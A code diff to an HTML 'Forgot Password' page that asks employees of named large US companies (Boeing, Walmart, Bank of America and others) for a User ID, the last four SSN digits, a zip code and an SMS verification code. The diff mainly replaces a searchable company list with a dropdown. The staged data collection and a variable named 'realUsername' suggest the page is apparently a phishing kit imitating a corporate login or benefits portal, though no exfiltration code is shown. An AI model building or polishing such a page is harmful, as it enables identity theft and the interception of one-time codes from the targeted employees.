@@ -44,9 +44,6 @@
             border-radius: 10px; 
             font-size: 1.05rem; 
         }
-        input[list] {
-            background-color: white;
-        }
         .date-group { display: flex; gap: 10px; }
         button { 
             width: 100%; 
@@ -73,58 +70,36 @@
         <!-- Step 0: Company + User ID -->
         <div id="step0" class="step active">
             <h1>Forgot Password</h1>
-            <p>Search or select your company and enter your User ID</p>
+            <p>Select your company and enter your User ID</p>
             
             <label for="company">Company</label>
-            <input list="companyList" id="company" placeholder="Type to search company..." required>
-            <datalist id="companyList">
-                <option value="UNITED AIRLINES">
-                <option value="BOEING">
-                <option value="SIEMENS ENERGY">
-                <option value="AON">
-                <option value="AMERICAN AIRLINES">
-                <option value="WALMART">
-                <option value="CATERPILLAR">
-                <option value="DOW">
-                <option value="HP INC">
-                <option value="VERIZON">
-                <option value="AT&T">
-                <option value="BANK OF AMERICA">
-                <option value="WELLS FARGO">
-                <option value="CITIGROUP">
-                <option value="GENERAL ELECTRIC">
-                <option value="LOCKHEED MARTIN">
-                <option value="NORTHROP GRUMMAN">
-                <option value="RAYTHEON TECHNOLOGIES">
-                <option value="3M">
-                <option value="JOHNSON & JOHNSON">
-                <option value="PFIZER">
-                <option value="UNITEDHEALTH GROUP">
-                <option value="CVS HEALTH">
-                <option value="KROGER">
-                <option value="TARGET">
-                <option value="LOWE'S">
-                <option value="WALGREENS">
-                <option value="HOME DEPOT">
-                <option value="IBM">
-                <option value="MICROSOFT">
-                <option value="AMAZON">
-                <option value="GOOGLE">
-                <option value="META">
-                <option value="INTEL">
-                <option value="PROCTER & GAMBLE">
-                <option value="PEPSICO">
-                <option value="COCA-COLA">
-                <option value="GENERAL MOTORS">
-                <option value="FORD MOTOR COMPANY">
-                <option value="DELTA AIR LINES">
-                <option value="SOUTHWEST AIRLINES">
-                <option value="FEDEX">
-                <option value="UPS">
-                <option value="JPMORGAN CHASE">
-                <option value="GOLDMAN SACHS">
-                <option value="MORGAN STANLEY">
-            </datalist>
+            <select id="company" required>
+                <option value="">Select your Company</option>
+                <option value="UNITED AIRLINES">UNITED AIRLINES</option>
+                <option value="BOEING">BOEING</option>
+                <option value="SIEMENS ENERGY">SIEMENS ENERGY</option>
+                <option value="AON">AON</option>
+                <option value="AMERICAN AIRLINES">AMERICAN AIRLINES</option>
+                <option value="DELTA AIR LINES">DELTA AIR LINES</option>
+                <option value="SOUTHWEST AIRLINES">SOUTHWEST AIRLINES</option>
+                <option value="WALMART">WALMART</option>
+                <option value="CATERPILLAR">CATERPILLAR</option>
+                <option value="HOME DEPOT">HOME DEPOT</option>
+                <option value="LOWE'S">LOWE'S</option>
+                <option value="TARGET">TARGET</option>
+                <option value="KROGER">KROGER</option>
+                <option value="CVS HEALTH">CVS HEALTH</option>
+                <option value="WALGREENS">WALGREENS</option>
+                <option value="BANK OF AMERICA">BANK OF AMERICA</option>
+                <option value="JPMORGAN CHASE">JPMORGAN CHASE</option>
+                <option value="VERIZON">VERIZON</option>
+                <option value="AT&T">AT&T</option>
+                <option value="IBM">IBM</option>
+                <option value="MICROSOFT">MICROSOFT</option>
+                <option value="AMAZON">AMAZON</option>
+                <option value="GOOGLE">GOOGLE</option>
+                <option value="META">META</option>
+            </select>
 
             <label for="userid">User ID</label>
             <input type="text" id="userid" placeholder="Enter your User ID" required autofocus>
@@ -133,7 +108,6 @@
             <button onclick="goBack()" style="background:none; border:1px solid #cbd5e1; color:#1e40af; margin-top:8px;">Back to Login</button>
         </div>
 
-        <!-- Step 1 -->
         <div id="step1" class="step">
             <h1>Confirm your identity</h1>
             <label>Last 4 Digits of SSN</label>
@@ -152,7 +126,6 @@
             <button class="continue" onclick="saveStep1()">Continue</button>
         </div>
 
-        <!-- Step 2 -->
         <div id="step2" class="step">
             <h1>Additional Information</h1>
             <label>Zip Code</label>
@@ -164,7 +137,6 @@
             <button class="continue" onclick="saveStep2()">Continue</button>
         </div>
 
-        <!-- Step 3 -->
         <div id="step3" class="step">
             <h1>Verify it's you</h1>
             <p>Enter the code you received via SMS.</p>
@@ -184,11 +156,11 @@
         let selectedCompany = "";
 
         function startForgotProcess() {
-            selectedCompany = document.getElementById('company').value.trim();
+            selectedCompany = document.getElementById('company').value;
             realUsername = document.getElementById('userid').value.trim();
 
             if (!selectedCompany || !realUsername) {
-                alert("Please select or search your Company and enter your User ID");
+                alert("Please select your Company and enter your User ID");
                 return;
             }
 
